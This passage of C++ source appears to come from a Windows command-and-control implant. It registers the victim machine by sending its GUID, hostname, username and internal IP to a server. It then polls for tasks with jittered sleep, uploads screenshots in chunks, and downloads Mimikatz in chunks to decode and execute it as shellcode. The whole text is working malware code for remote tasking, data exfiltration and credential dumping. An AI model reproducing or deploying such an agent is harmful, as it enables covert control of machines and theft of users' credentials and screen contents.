		uploadStartData["path"] = "screenshots/screenshot_" + taskID + ".png";

		// Wrap data
		json uploadStart;
		uploadStart["ht"] = 4; // UploadStart
		uploadStart["data"] = base64_encode(uploadStartData.dump());

		std::string startResponse = sendRequest(uploadStart.dump());
		PRINTF("startResponse: %s\n", startResponse.c_str());
		if (startResponse.find("error") != std::string::npos) {
			PRINTF("[-] UploadStart failed\n");
			return;
		}
		// Parse response for file_id
		json startJson = json::parse(startResponse);
		std::string fileId = startJson.at("id");

		//size_t n1 = 0;
		//size_t n = 4096;
		while (n1 < screenshotData.size()) {
			std::string chunk = screenshotData.substr(n1, n - n1);

			json uploadChunk;
			uploadChunk["content"] = base64_encode(chunk);
			uploadChunk["file_id"] = fileId;  // <-- FIXED here

			json uploadChunkWrap;
			uploadChunkWrap["ht"] = 5;
			uploadChunkWrap["data"] = base64_encode(uploadChunk.dump());

			std::string uploadResponse = sendRequest(uploadChunkWrap.dump());
			PRINTF("%s\n", uploadResponse.c_str());

			n1 = n;
			n += 4096;
			if (n > screenshotData.size()) n = screenshotData.size();
		}



		json uploadEnd;
		PRINTF("[DEBUG] Final uploadEnd fileId: %s\n", fileId.c_str());
		if (fileId.empty()) {
			PRINTF("[!!] ERROR: fileId is empty — cannot finalize upload!\n");
			return;
		}

		uploadEnd["task_id"] = taskID;
		uploadEnd["agent_id"] = agent_id;
		uploadEnd["result"] = "";
		uploadEnd["status"] = 4;
		uploadEnd["file_id"] = fileId;

		json uploadEndWrap;
		uploadEndWrap["ht"] = 6;
		uploadEndWrap["data"] = base64_encode(uploadEnd.dump());
		std::string endResponse = sendRequest(uploadEndWrap.dump());
		PRINTF("[DEBUG] UploadEnd response: %s\n", endResponse.c_str());

		sendTaskResult(agent_id, taskID, 4, "");
	}
}

//---------------------------------------------------------------------
void handleSleep(const std::string &agent_id, const std::string &taskID, const std::string &taskInput)
{
	int sleepTime, jitterMax, jitterMin;
	std::stringstream ss(taskInput);
	std::vector<int> sleepvals;
	int temp;
	while (ss >> temp) {
		sleepvals.push_back(temp);
	}

	if (sleepvals.size() < 2) {
		sendTaskResult(agent_id, taskID, 5, "Invalid sleep input");
		PRINTF("[-] Invalid sleep parameters: '%s'\n", taskInput.c_str());
		return;
	}

	sleepTime = sleepvals[0];
	jitterMax = sleepvals[1];
	jitterMin = (sleepvals.size() >= 3) ? sleepvals[2] : 25;  // Default to 25 if not provided

	setJitter(sleepTime, jitterMax, jitterMin);
	
	sendTaskResult(agent_id, taskID, 4, "");
}

//---------------------------------------------------------------------
void setJitter(int sleepTime, int jitterMax, int jitterMin)
{
	if (jitterMin > jitterMax) jitterMin = 0;
	jitterMax = (sleepTime * jitterMax) / 100;
	jitterMin = (sleepTime * jitterMin) / 100;
	int randomJitter = rand() % (jitterMax + 1) + jitterMin;
	SLEEP_TIME = sleepTime + randomJitter;
}

//---------------------------------------------------------------------
void handleMimikatz(const std::string &agent_id, const std::string &taskID, const std::string &taskInput, const std::string &fileID) {
	PRINTF("[DEBUG] Entered handleSS()\n");

	json start;
	start["task_id"] = taskID;
	start["file_id"] = fileID;

	json DownloadStart;
	DownloadStart["ht"] = 7;
	DownloadStart["data"] = base64_encode(start.dump());

	std::string startcheck = sendRequest(DownloadStart.dump());
	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());

	json startRet = json::parse(startcheck);
	int totalChunks = startRet.at("total");
	int nextChunkID = startRet.at("next_chunk_id");
	std::string mimikatz = startRet.at("chunk");

	while (nextChunkID != 0) {
		json downloadChunk;
		downloadChunk["file_id"] = fileID;
		downloadChunk["chunk_id"] = nextChunkID;

		json wrapDownloadChunk;
		wrapDownloadChunk["ht"] = 8;
		wrapDownloadChunk["data"] = base64_encode(downloadChunk.dump());

		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());
		json chunkJ = json::parse(downloadChunkResponse);
		std::string newchunk = chunkJ.at("chunk");
		mimikatz.append(newchunk);
		nextChunkID = chunkJ.at("next_chunk_id");
	}

	json endDownloadData;
	endDownloadData["task_id"] = taskID;
	endDownloadData["agent_id"] = agent_id;
	endDownloadData["status"] = 4;

	json endDownload;
	endDownload["ht"] = 9;
	endDownload["data"] = base64_encode(endDownloadData.dump());

	std::string endDownloadCheck = sendRequest(endDownload.dump());
	PRINTF("[DEBUG] DownloadEnd response: %s\n", endDownloadCheck.c_str());

	json startData = json::parse(startcheck);
	std::string shellcodeB64 = startData.at("chunk");

	std::string shellcode = base64_decode(shellcodeB64);
	PRINTF("[DEBUG] Shellcode decoded, size: %zu bytes\n", shellcode.size());
	std::string result = load_execute_mimikatz(shellcode, taskInput);
	sendTaskResult(agent_id, taskID, 4, result);
	
}

//---------------------------------------------------------------------
void getMachineGUID(WCHAR* guid, DWORD bufferSize)
{
	HKEY hKey;

	LONG result = RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Cryptography",
		0,
		KEY_READ | KEY_WOW64_64KEY,
		&hKey
	);

	if (result == ERROR_SUCCESS) {
		PRINTF("[+] Opened registry key.\n");

		result = RegQueryValueExW(hKey, L"MachineGuid", NULL, NULL, (LPBYTE)guid, &bufferSize);
		if (result != ERROR_SUCCESS) {
			PRINTF("[!] Failed to read MachineGUID.\n");
		}

		RegCloseKey(hKey);
	}
	else {
		PRINTF("[!] Failed to open registry key.\n");
	}
}

//---------------------------------------------------------------------
std::string getInternalIP() 
{
	// default case if the IP can't be captured
	std::string ip_address = "unknown";

	// Allocate a 15 KB buffer to start with
	ULONG outBufLen = 15000;
	PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
	if (!pAddresses) {
		PRINTF("[-] Memory allocation failed\n");
		return ip_address;
	}

	// Get adapter addresses
	// reference: https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersaddresses
	DWORD result = GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen);
	if (result == NO_ERROR) {
		// Iterate through all adapters
		for (PIP_ADAPTER_ADDRESSES adapter = pAddresses; adapter; adapter = adapter->Next) {
			// Skip loopback adapters
			if (adapter->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
				continue;
			}

			// Skip adapters that are not connected
			if (adapter->OperStatus != IfOperStatusUp) {
				continue;
			}

			// Get the unicast IP address
			for (PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress; unicast; unicast = unicast->Next) {
				if (unicast->Address.lpSockaddr->sa_family == AF_INET) {
					struct sockaddr_in* addr = (struct sockaddr_in*)unicast->Address.lpSockaddr;
					char ipStr[INET_ADDRSTRLEN];
					inet_ntop(AF_INET, &(addr->sin_addr), ipStr, INET_ADDRSTRLEN);
					ip_address = ipStr;
					// Found a valid IP, no need to continue
					free(pAddresses);
					PRINTF("[*] Retrieved internal IP: %s\n", ip_address.c_str());
					return ip_address;
				}
			}
		}
	}
	else {
		PRINTF("[-] GetAdaptersAddresses failed with error: %d\n", result);
	}

	free(pAddresses);
	PRINTF("[*] Retrieved internal IP: %s\n", ip_address.c_str());
	return ip_address;
}

//---------------------------------------------------------------------
//---------------------------------------------------------------------
int MAIN {
	PRINTF("[*] Starting client...\n");

	DWORD usernameSize = 256;
	char username[256] = { 0 };
	if (!GetUserNameA(username, &usernameSize)) {
		PRINTF("[-] GetUserNameA failed.\n");
		return 1;
	}

	std::string host;
	if (!GetHost(host)) {
		host = "unknown";
	}

	std::string arch = GetArch();
	int integ = 3;

	// getGUID integration
	WCHAR guid[256] = { 0 };
	getMachineGUID(guid, sizeof(guid));

	// internalIP integration
	std::string internal_ip = getInternalIP();

	std::string registrationData = R"({
        "machine_guid": ")" + WCharToString(guid) + R"(",
        "hostname": ")" + host + R"(",
        "username": ")" + std::string(username) + R"(",
        "os": "Windows 10",
        "internal_ip": ")" + internal_ip + R"(",
        "external_ip": "",
        "process_arch": 1,
        "integrity": )" + std::to_string(integ) + R"(
    })";

	std::string encodedData = base64_encode(registrationData);
	std::string registrationJson = R"({"ht":1,"data":")" + encodedData + R"("})";

	PRINTF("[+] Attempting to register client...\n");
	std::string registrationResponse = sendRequest(registrationJson);
	if (registrationResponse.empty()) {

		PRINTF("[-] Registration failed. Exiting.\n");
		return 1;
	}
	PRINTF("[+] Registration successful!\n");

	json regOuter = json::parse(registrationResponse);
	std::string b64regData = regOuter.at("data");
	std::string decodedRegData = base64_decode(b64regData);
	json regDataJson = json::parse(decodedRegData);
	std::string agent_id = regDataJson.at("agent_id");
	PRINTF("[*] Agent ID: %s\n\n", agent_id.c_str());

	PRINTF("[+] Begin Getting Tasks:\n");
	while (true) {
		PRINTF("\n[+] Attempting to pull task...\n");
		#if VERBOSE
				time_t now = time(0);
				char* dt = ctime(&now);
				PRINTF("[*] Checking in at: %s", dt);
		#endif

		std::string taskResponse = getNextTask(agent_id);
		if (taskResponse.empty()) {
			Sleep(SLEEP_TIME * 1000);
			continue;
		}

		json responseJson = json::parse(taskResponse);
		std::string b64Data = responseJson.value("data", "");
		if (b64Data.empty()) {
			PRINTF("[*] No tasks available, sleeping for %d seconds\n", SLEEP_TIME);
			Sleep(SLEEP_TIME * 1000);
			continue;
		}

		std::string decodedData = base64_decode(b64Data);
		PRINTF("[*] Task Received! Task Data:\n%s\n", decodedData.c_str());

		json taskJson = json::parse(decodedData);
		int taskType = taskJson.value("type", 0);
		std::string taskID = taskJson.value("id", "");
		std::string taskInput = taskJson.value("input", "");
		std::string fileID = taskJson.value("file_id", "");

		handleTask(agent_id, taskID, taskType, taskInput, fileID);

		if (taskType == 1) {
			break;
		}
	}

	return 0;
}